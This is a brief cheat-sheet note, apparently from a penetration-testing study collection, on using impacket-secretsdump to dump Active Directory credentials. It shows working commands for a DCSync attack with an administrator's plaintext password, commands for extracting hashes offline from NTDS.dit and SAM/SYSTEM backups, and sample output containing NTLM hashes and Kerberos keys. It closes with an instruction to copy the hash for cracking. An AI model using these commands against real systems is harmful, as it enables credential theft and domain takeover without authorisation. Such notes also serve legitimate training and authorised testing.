---
tags:
---
# secretsdump

Perform DCSync attacks

## Capabilities

```bash
# Perform a DCSync attack against the user dave, as jeffadmin
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

# Extract credentials from a shadow copy
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

# Extract credentials from windows.old
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
```

Given the following example:

```
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494::: <- look here
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
```

We copy the following value to crack

```
08d7a47a6f9f66b97b1bae4178747494
```
